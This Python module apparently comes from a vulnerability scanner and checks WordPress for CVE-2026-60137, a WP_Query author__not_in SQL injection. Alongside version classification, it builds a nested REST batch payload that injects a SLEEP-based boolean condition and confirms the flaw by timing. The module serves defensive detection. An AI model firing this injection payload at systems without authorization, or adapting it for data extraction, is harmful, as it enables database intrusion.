from __future__ import annotations

import json
import statistics
import time
import urllib.parse
from typing import Any

from ...core.http import normalize_url, request
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-60137"
NAME = "WordPress core WP_Query author__not_in SQL injection"
COMPONENT = "WordPress core"
AFFECTED_RULE = "WordPress 6.8.0-6.8.5, 6.9.0-6.9.4, and 7.0.0-7.0.1"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]

FIRST_FIXED_BY_BRANCH = {
    "6.8": "6.8.6",
    "6.9": "6.9.5",
    "7.0": "7.0.2",
}
STOCK_BATCH_DELIVERY_BRANCHES = {"6.9", "7.0"}


def classify_version(wordpress_version: str | None) -> str:
    version = parse_version_safe(wordpress_version)
    if version is None:
        return "INCONCLUSIVE"
    branch = f"{version.major}.{version.minor}"
    fixed = parse_version_safe(FIRST_FIXED_BY_BRANCH.get(branch))
    if fixed is None:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if version < fixed else "PATCHED"


def _supports_stock_delivery(wordpress_version: str | None) -> bool:
    version = parse_version_safe(wordpress_version)
    return bool(version and f"{version.major}.{version.minor}" in STOCK_BATCH_DELIVERY_BRANCHES)


def passive_result(wordpress_version: str | None) -> Finding:
    status = classify_version(wordpress_version)
    if status == "INCONCLUSIVE":
        detail = "WordPress was detected, but its core version could not be determined."
        action = "Determine the WordPress version and upgrade affected branches to their fixed security release."
        confidence = "MEDIUM"
    elif status == "LIKELY_VULNERABLE":
        detail = f"WordPress {wordpress_version} is within an affected range published by WordPress."
        if not _supports_stock_delivery(wordpress_version):
            detail += " The stock REST batch delivery chain does not apply to the 6.8 branch."
        action = "Upgrade to WordPress 6.8.6, 6.9.5, 7.0.2, or a newer supported release as appropriate."
        confidence = "HIGH"
    elif status == "PATCHED":
        detail = f"WordPress {wordpress_version} includes the branch-specific fix for CVE-2026-60137."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = f"WordPress {wordpress_version} is outside the advisory's affected branches."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=wordpress_version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=action,
    )


def _batch_payload(condition: str, delay: float) -> bytes:
    injection = f"SELECT IF(({condition}),SLEEP({delay:.3f}),0)"
    query = urllib.parse.urlencode({"author_exclude": injection})
    payload = {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {
                "method": "POST",
                "path": "/wp/v2/posts",
                "body": {
                    "requests": [
                        {"method": "GET", "path": "http://:"},
                        {"method": "GET", "path": f"/wp/v2/categories?{query}"},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]
                },
            },
            {"method": "POST", "path": "/batch/v1"},
        ]
    }
    return json.dumps(payload, separators=(",", ":")).encode()


def _timed_probe(
    target_url: str,
    condition: str,
    delay: float,
    timeout: int,
    proxy: str | None,
) -> tuple[float, dict[str, Any]]:
    started = time.monotonic()
    response = request(
        f"{normalize_url(target_url)}/?rest_route=/batch/v1",
        method="POST",
        headers={"Content-Type": "application/json"},
        data=_batch_payload(condition, delay),
        timeout=timeout,
        proxy=proxy,
    )
    return time.monotonic() - started, response


def run_safe_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    delay: float = 0.35,
    rounds: int = 3,
) -> Finding:
    fast_samples: list[float] = []
    slow_samples: list[float] = []
    statuses: list[int] = []
    for round_index in range(rounds):
        conditions = ("1=0", "1=1") if round_index % 2 == 0 else ("1=1", "1=0")
        for condition in conditions:
            elapsed, response = _timed_probe(target_url, condition, delay, timeout, proxy)
            (slow_samples if condition == "1=1" else fast_samples).append(elapsed)
            statuses.append(int(response.get("status", 0)))

    fast_median = statistics.median(fast_samples)
    slow_median = statistics.median(slow_samples)
    margin = slow_median - fast_median
    route_responded = bool(statuses) and all(status > 0 for status in statuses)
    detail_suffix = (
        f"false median={fast_median:.3f}s, true median={slow_median:.3f}s, "
        f"margin={margin:.3f}s across {rounds} paired probes."
    )
    if route_responded and margin >= max(0.12, delay * 0.55):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{normalize_url(target_url)}/?rest_route=/batch/v1",
            detail="A harmless true/false timing differential confirmed the SQL injection. " + detail_suffix,
            action="Upgrade WordPress to the fixed release for the installed branch immediately.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail="The timing probe did not produce a reliable SQL injection differential. " + detail_suffix,
        action="Upgrade any version in the published affected ranges even when active proof is inconclusive.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    passive = passive_result(cms_version)
    if not run_exploit_check:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This module supports only the safe differential timing proof."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        passive.detail += " Safe proof skipped because the detected version is outside the affected range."
        return passive
    if cms_version and not _supports_stock_delivery(cms_version):
        passive.detail += " Active proof skipped because this version lacks the stock REST batch delivery path."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = cms_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["6.8.0-6.8.5", "6.9.0-6.9.4", "7.0.0-7.0.1"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-28",
        "updated": "2026-09-28",
        "required_detectors": [],
        "references": [
            "https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf",
            "https://wordpress.org/news/2026/07/wordpress-7-0-2-release/",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-60137",
            "https://github.com/ZephrFish/wp2shell-scanner",
        ],
    }
